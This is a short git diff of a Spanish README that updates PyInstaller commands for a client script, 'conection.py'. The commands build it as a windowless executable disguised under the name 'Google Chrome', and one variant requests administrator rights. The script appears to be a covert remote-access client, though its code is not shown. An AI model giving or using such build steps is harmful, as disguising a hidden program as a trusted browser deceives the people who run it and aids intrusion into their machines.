@@ -94,13 +94,13 @@ Una véz hecho esto podremos ejecutar el script, no requerimos de ningún cambio
   
     - Admin Required:
       
-        `client>pyinstaller --onefile --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
+        `client>python -m pyinstaller --onefile --noconsole --clean --uac-admin -n "Google Chrome" conection.py`
 
     - **NO** Admin Required:
       
-        `client>pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`
+        `client>python -m pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`
 
     ### Linux:
       
-    `client>pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`
+    `client>python3 -m pyinstaller --onefile --noconsole --clean -n "Google Chrome" conection.py`
 
